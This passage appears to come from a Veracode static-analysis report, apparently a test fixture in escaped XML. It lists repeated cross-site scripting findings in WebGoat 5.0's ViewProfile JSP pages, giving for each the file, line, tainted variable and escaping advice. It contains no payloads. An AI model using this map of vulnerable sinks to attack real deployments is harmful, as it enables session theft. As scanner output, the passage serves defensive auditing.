        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"16\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"237\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"18\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"72\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"52\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"18\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"-1\">\n<note>The source of the tainted data in this web
        application flaw is not a web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"88\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getFirstName().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"53\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"18\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"130\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getFirstName().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"54\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"21\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"107\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getFirstName().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"54\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"21\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"174\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"55\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"196\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"56\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"23\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"8\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"56\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"23\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"254\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress1().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, javax.servlet.servletrequest.getparametervalues,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"57\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"22\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"213\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress1().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, javax.servlet.servletrequest.getparametervalues,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"58\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"156\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress1().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, javax.servlet.servletrequest.getparametervalues,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"58\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"222\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
